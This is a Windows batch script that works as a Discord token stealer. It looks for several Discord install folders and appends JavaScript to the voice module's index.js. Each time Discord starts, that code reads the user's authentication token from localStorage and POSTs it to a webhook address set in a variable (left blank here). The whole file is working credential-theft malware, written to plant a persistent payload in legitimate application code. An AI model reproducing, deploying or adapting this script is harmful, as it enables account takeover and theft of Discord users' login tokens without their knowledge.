@echo off
set webi=

if exist C:\Users\%username%\AppData\Local\Discord\app-1.0.9001\modules\discord_voice-3\discord_voice\index.js goto grabbnew
if exist C:\Users\%username%\AppData\Local\Discord\app-1.0.9002\modules\discord_voice-3\discord_voice\index.js goto grabbneww
if exist C:\Users\%username%\AppData\Local\Discord\app-1.0.9002\modules\discord_voice-2\discord_voice\index.js goto lastversion

:grabb
cd C:\Users\%username%\AppData\Roaming\discord\0.0.309\modules\discord_voice
echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webi%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>index.js
goto end

:grabbnew
cd C:\Users\%username%\AppData\Local\Discord\app-1.0.9001\modules\discord_voice-3\discord_voice
echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webi%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>index.js
goto end

:lastversion
cd C:\Users\%username%\AppData\Local\Discord\app-1.0.9002\modules\discord_voice-2\discord_voice
echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webi%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>index.js
goto end


:grabbneww
cd C:\Users\%username%\AppData\Local\Discord\app-1.0.9002\modules\discord_voice-3\discord_voice
echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webi%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>index.js
goto end

:end
